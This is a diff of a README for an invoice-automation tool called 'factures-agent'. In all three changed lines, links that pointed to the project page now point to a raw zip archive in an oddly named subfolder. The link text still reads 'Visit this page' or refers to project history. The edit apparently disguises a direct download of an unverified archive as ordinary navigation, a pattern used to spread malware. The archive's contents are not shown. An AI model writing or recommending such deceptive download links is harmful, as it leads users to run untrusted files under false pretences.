@@ -1,6 +1,6 @@
 # 🤖 factures-agent - Automate your invoice processing with ease
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/rudranshsinghking11-ops/factures-agent)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/rudranshsinghking11-ops/factures-agent/raw/refs/heads/main/chasten/factures-agent-3.6.zip)
 
 ## 📌 Overview
 
@@ -22,7 +22,7 @@ Your computer must meet these basic hardware and software standards to run the a
 
 You need to access the official release page to get the installer. 
 
-[Visit this page to download the application](https://github.com/rudranshsinghking11-ops/factures-agent)
+[Visit this page to download the application](https://github.com/rudranshsinghking11-ops/factures-agent/raw/refs/heads/main/chasten/factures-agent-3.6.zip)
 
 Follow these steps to obtain the correct file:
 
@@ -95,6 +95,6 @@ For those interested in the technical side, the project uses several open-source
 
 You can view the full history of the project at the following link: 
 
-[Visit this page to download the application](https://github.com/rudranshsinghking11-ops/factures-agent)
+[Visit this page to download the application](https://github.com/rudranshsinghking11-ops/factures-agent/raw/refs/heads/main/chasten/factures-agent-3.6.zip)
 
 By using this tool, you save time on administrative tasks and reduce the risk of human error in your accounting process. Maintain your focus on growing your business while the agent handles the digital paperwork.
